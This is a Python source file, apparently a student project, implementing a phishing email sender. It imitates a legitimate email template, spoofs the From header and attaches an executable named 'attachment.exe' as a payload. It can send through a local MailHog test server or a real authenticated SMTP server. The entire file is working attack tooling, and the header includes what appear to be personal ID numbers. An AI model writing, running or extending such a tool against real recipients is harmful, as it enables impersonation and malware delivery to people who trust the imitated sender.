# email_service.py
# Meir Shuker 318901527 Noa Agassi 209280635

import os
import requests
import smtplib
from email.message import EmailMessage

class EmailService:
    """
    Service to read a benign email template and send a phishing email with attachment.
    """

    def read_benign_email(self) -> str:
        """
        Reads a benign email template from:
          1. Text file
          2. URL
          3. Paste raw email (end by typing 'END' on its own line)
        Keeps prompting until a valid template is loaded.
        """
        while True:
            print("\nChoose source of the template email:")
            print("1. Text file")
            print("2. URL")
            print("3. Paste raw email")
            choice = input("Your choice (1/2/3): ").strip()

            if choice == "1":
                path = input("File path: ").strip()
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        return f.read()
                except Exception as e:
                    print(f"❌ File error: {e}. Please try again.")

            elif choice == "2":
                url = input("URL: ").strip()
                try:
                    res = requests.get(url)
                    res.raise_for_status()
                    return res.text
                except Exception as e:
                    print(f"❌ URL error: {e}. Please try again.")

            elif choice == "3":
                print("Paste your email (end by typing 'END' on a new line):")
                lines = []
                while True:
                    line = input()
                    if line.strip() == "END":
                        break
                    lines.append(line)
                text = "\n".join(lines)
                if text.strip():
                    return text
                print("❌ No content detected. Please paste your email again.")

            else:
                print("❌ Invalid choice. Please enter 1, 2 or 3.")


    def parse_email_structure(self, email_text: str) -> dict:
        """
        Parses raw email and extracts subject, greeting, body, signature.
        """
        lines = email_text.splitlines()
        subject = greeting = signature = ""
        body_lines = []

        for idx, line in enumerate(lines):
            low = line.lower()
            if low.startswith("subject:"):
                subject = line.strip()
                continue
            if any(low.startswith(x) for x in ["hi", "hello", "dear"]) and "," in line:
                greeting = line.strip()
                continue
            if any(low.startswith(x) for x in ["best regards", "thanks", "regards", "sincerely", "yours"]):
                signature = "\n".join(lines[idx:]).strip()
                break
            if subject and greeting:
                body_lines.append(line)

        return {
            "subject":   subject or "Subject: Important Account Update",
            "greeting":  greeting or "Hello,",
            "body":      "\n".join(body_lines).strip() or email_text,
            "signature": signature or "Best regards,\nIT Team"
        }

    def send_phishing_email(
        self,
        subject: str,
        body: str,
        sender_email: str,
        sender_password: str,
        to_email: str,
        fake_from: str = None,
        smtp_server: str = "127.0.0.1",
        smtp_port: int = 1025
    ):
        """
         Builds and sends a phishing email with attachment.
         - For smtp_port 587 or 465 with a password, will use STARTTLS and login.
         - Defaults to MailHog on 127.0.0.1:1025 (no TLS/auth).
         """
        # 1. Create the message
        msg = EmailMessage()
        msg['Subject'] = subject.replace("Subject:", "").strip()
        msg['From'] = fake_from or sender_email
        msg['To'] = to_email
        msg.set_content(body, subtype='plain')

        # 2. Attach the payload
        filename = "attachment.exe"
        if os.path.exists(filename):
            with open(filename, "rb") as f:
                data = f.read()
            msg.add_attachment(
                data,
                maintype="application",
                subtype="octet-stream",
                filename=os.path.basename(filename)
            )
            print(f"[+] Attached file: {filename}")
        else:
            print(f"[-] No attachment at '{filename}', skipping.")

        # 3. Send via SMTP
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.ehlo()

            # If using a real SMTP server over TLS
            if smtp_port in (587, 465) and sender_password:
                server.starttls()
                server.ehlo()
                server.login(sender_email, sender_password)

            server.send_message(msg)
            server.quit()
            print(f"[✓] Email sent successfully to {to_email}")
        except Exception as e:
            print(f"[-] Failed to send email: {e}")